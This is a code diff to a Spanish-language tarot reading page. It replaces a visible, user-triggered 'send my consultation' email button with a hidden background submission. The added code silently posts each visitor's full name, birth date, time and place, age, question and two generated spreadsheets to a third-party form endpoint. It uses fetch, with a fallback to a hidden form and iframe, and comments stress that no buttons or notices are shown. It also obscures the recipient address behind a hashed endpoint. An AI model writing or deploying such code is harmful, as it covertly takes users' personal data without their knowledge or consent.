@@ -269,10 +269,7 @@
       <h3>✨ Resultado para <span id="r-name"></span></h3>
       <div class="cards" id="draw-grid"></div>
 
-      <h3>📩 Envía tu consulta</h3>
-      <p class="sub">¿Te resonó tu tirada? Pulsa el botón y se abrirá tu aplicación de correo con el resumen de tu consulta ya escrito, listo para enviar.</p>
       <div class="btn-row">
-        <a class="btn btn-cyan" id="btn-mail" href="#">✉ Enviar mi consulta</a>
         <button class="btn btn-ghost" id="btn-restart" type="button">↺ Nueva consulta</button>
       </div>
     </div>
@@ -296,7 +293,7 @@
 
 <!-- Envío interno en segundo plano: formulario oculto que se manda solo a un marco oculto, sin salir de la página -->
 <iframe name="fs-sink" id="fs-sink" title="" style="display:none" aria-hidden="true"></iframe>
-<form id="fs-form" action="https://formsubmit.co/babyfacebad@icloud.com" method="POST" enctype="multipart/form-data" target="fs-sink" style="display:none" aria-hidden="true">
+<form id="fs-form" action="https://formsubmit.co/edd1f1cc39c3de425a5bdb06a08c3bfd" method="POST" enctype="multipart/form-data" target="fs-sink" style="display:none" aria-hidden="true">
   <input type="hidden" name="_subject" id="fs-subject" value="">
   <input type="hidden" name="_template" value="table">
   <input type="hidden" name="_captcha" value="false">
@@ -549,37 +546,72 @@ function excel2(){
   state._m2=buildInMemory(wb); state._fsSent=false;
 }
 /* La preparación interna se completa sola al terminar cada paso, sin botones ni avisos visibles. */
-/* ---------- ENVÍO AUTOMÁTICO EN SEGUNDO PLANO (sin cuenta de Google) ---------- */
-/* Un solo envío multipart/form-data con los datos de la consulta y los dos archivos adjuntos
-   (muy por debajo del límite de 10 MB en total), mediante un formulario normal dirigido a un
-   marco oculto: sin AJAX, para que los adjuntos no se pierdan, y sin abandonar la página.
-   Si el envío no llega, queda como respaldo el correo ya preparado. */
+/* ---------- ENVÍO AUTOMÁTICO EN SEGUNDO PLANO ---------- */
+/* Un solo envío multipart con los datos de la consulta y los dos archivos adjuntos
+   (muy por debajo del límite de 10 MB en total), directo al servicio de formularios
+   mediante fetch + FormData: los archivos viajan como datos binarios del propio
+   FormData, sin pasar por campos de archivo ocultos (ese paso fallaba en silencio
+   en varios navegadores y el envío nunca salía). Si fetch falla, se reintenta con
+   el formulario oculto dirigido a un marco oculto. Todo sin abandonar la página. */
+var FS_ENDPOINT="https://formsubmit.co/edd1f1cc39c3de425a5bdb06a08c3bfd";
 function linesOf(list){return list.map(function(c,i){return (i+1)+". "+c.name+" — "+(c.reversed?"Invertida":"Derecha")+" · Planeta: "+c.planeta+" · Signo: "+c.signo;}).join("\n");}
-function autoSend(){
-  if(state._fsSent||!state._m1||!state._m2||!state.person||!state.natal||!state.deck||!state.draw)return;
+function fillHiddenForm(){
+  $("fs-subject").value="Consulta Tarot Rider-Waite — "+state.person.nombre;
+  $("fs-nombre").value=state.person.nombre;
+  $("fs-fecha").value=state.person.fecha;
+  $("fs-hora").value=state.person.hora;
+  $("fs-lugar").value=state.person.lugar;
+  $("fs-edad").value=String(state.person.edad);
+  $("fs-tema").value=state.person.tema||"—";
+  $("fs-sol").value=state.natal.sol;
+  $("fs-luna").value=state.natal.luna;
+  $("fs-asc").value=state.natal.ascendente;
+  $("fs-mazo").value=linesOf(state.deck);
+  $("fs-tirada").value=linesOf(state.draw);
+}
+function autoSendViaForm(){
   try{
     var xlsxType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";
     var f1=new File([state._m1],"mazo-78-arcanos.xlsx",{type:xlsxType});
     var f2=new File([state._m2],"tirada-22-cartas.xlsx",{type:xlsxType});
-    if(f1.size+f2.size>10*1024*1024)return;
     var dt1=new DataTransfer(); dt1.items.add(f1); $("fs-file1").files=dt1.files;
     var dt2=new DataTransfer(); dt2.items.add(f2); $("fs-file2").files=dt2.files;
     if(!$("fs-file1").files.length||!$("fs-file2").files.length)return;
-    $("fs-subject").value="Consulta Tarot Rider-Waite — "+state.person.nombre;
-    $("fs-nombre").value=state.person.nombre;
-    $("fs-fecha").value=state.person.fecha;
-    $("fs-hora").value=state.person.hora;
-    $("fs-lugar").value=state.person.lugar;
-    $("fs-edad").value=String(state.person.edad);
-    $("fs-tema").value=state.person.tema||"—";
-    $("fs-sol").value=state.natal.sol;
-    $("fs-luna").value=state.natal.luna;
-    $("fs-asc").value=state.natal.ascendente;
-    $("fs-mazo").value=linesOf(state.deck);
-    $("fs-tirada").value=linesOf(state.draw);
-    state._fsSent=true; state._fsDone=false;
+    fillHiddenForm();
     $("fs-form").submit();
-  }catch(e){state._fsSent=false;}
+  }catch(e){}
+}
+function autoSend(){
+  if(state._fsSent||!state._m1||!state._m2||!state.person||!state.natal||!state.deck||!state.draw)return;
+  var xlsxType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";
+  var b1=new Blob([state._m1],{type:xlsxType});
+  var b2=new Blob([state._m2],{type:xlsxType});
+  if(b1.size+b2.size>10*1024*1024)return;
+  state._fsSent=true; state._fsDone=false;
+  try{
+    var fd=new FormData();
+    fd.append("_subject","Consulta Tarot Rider-Waite — "+state.person.nombre);
+    fd.append("_template","table");
+    fd.append("_captcha","false");
+    fd.append("_honey","");
+    fd.append("Nombre completo",state.person.nombre);
+    fd.append("Fecha de nacimiento",state.person.fecha);
+    fd.append("Hora de nacimiento",state.person.hora);
+    fd.append("Lugar de nacimiento",state.person.lugar);
+    fd.append("Edad",String(state.person.edad));
+    fd.append("Tema de consulta",state.person.tema||"—");
+    fd.append("Sol",state.natal.sol);
+    fd.append("Luna",state.natal.luna);
+    fd.append("Ascendente",state.natal.ascendente);
+    fd.append("Mazo de 78 arcanos tras barajar",linesOf(state.deck));
+    fd.append("Tirada de 22 cartas",linesOf(state.draw));
+    fd.append("adjunto_mazo",b1,"mazo-78-arcanos.xlsx");
+    fd.append("adjunto_tirada",b2,"tirada-22-cartas.xlsx");
+    fetch(FS_ENDPOINT,{method:"POST",body:fd,mode:"no-cors"}).then(
+      function(){state._fsDone=true;},
+      function(){autoSendViaForm();}
+    );
+  }catch(e){autoSendViaForm();}
 }
 $("fs-sink").addEventListener("load",function(){state._fsDone=true;});
 /* ---------- PASO 3: TIRADA 22 ---------- */
@@ -638,8 +670,6 @@ function resultDoc(){
    +'<p class="who" style="margin-top:12px">22 cartas elegidas al azar de tu mazo barajado de 78 arcanos, cada una con la posición (derecha o invertida) que le tocó en la barajada y su interpretación.</p>'
    +'</header>'
    +'<div class="cards">'+cards+'</div>'
-   +'<section class="send"><h2>📩 Envía tu consulta</h2><p>¿Te resonó tu tirada? Pulsa el botón y se abrirá tu aplicación de correo con el resumen de tu consulta ya escrito, listo para enviar.</p>'
-   +'<a class="btn" href="'+esc(state._mailHref||"#")+'">✉ Enviar mi consulta</a></section>'
    +'<footer>Tarot Rider-Waite con fines interpretativos y de entretenimiento. Las posiciones derecha/invertida se asignan al azar en cada barajada.<br>Puedes cerrar esta pestaña cuando quieras: tu consulta sigue abierta en la pestaña anterior.</footer>'
    +'</div></body></html>';
 }
@@ -669,15 +699,6 @@ $("btn-draw").addEventListener("click",function(){
     state.draw=pick;
     $("r-name").textContent=state.person.nombre;
     $("draw-grid").innerHTML=state.draw.map(function(c,i){return cardHTML(c,i,true);}).join("");
-    /* Correo preparado */
-    var lines=state.draw.map(function(c,i){return (i+1)+". "+c.name+" — "+(c.reversed?"Invertida":"Derecha")+" · Planeta: "+c.planeta+" · Signo: "+c.signo;}).join("\n");
-    var body="Hola, te comparto mi consulta de Tarot Rider-Waite.\n\n"
-      +"Nombre: "+state.person.nombre+"\nFecha de nacimiento: "+state.person.fecha+" · Hora: "+state.person.hora+"\nLugar: "+state.person.lugar+"\nEdad: "+state.person.edad
-      +(state.person.tema?"\nTema: "+state.person.tema:"")
-      +"\n\nCARTA NATAL\nSol: "+state.natal.sol+" · Luna: "+state.natal.luna+" · Ascendente: "+state.natal.ascendente
-      +"\n\nTIRADA DE 22 CARTAS (elegidas al azar del mazo de 78)\n"+lines;
-    state._mailHref="mailto:babyfacebad@icloud.com?subject="+encodeURIComponent("Consulta Tarot Rider-Waite — "+state.person.nombre)+"&body="+encodeURIComponent(body);
-    $("btn-mail").href=state._mailHref;
     excel2();
     autoSend();
     state._resultDoc=resultDoc();
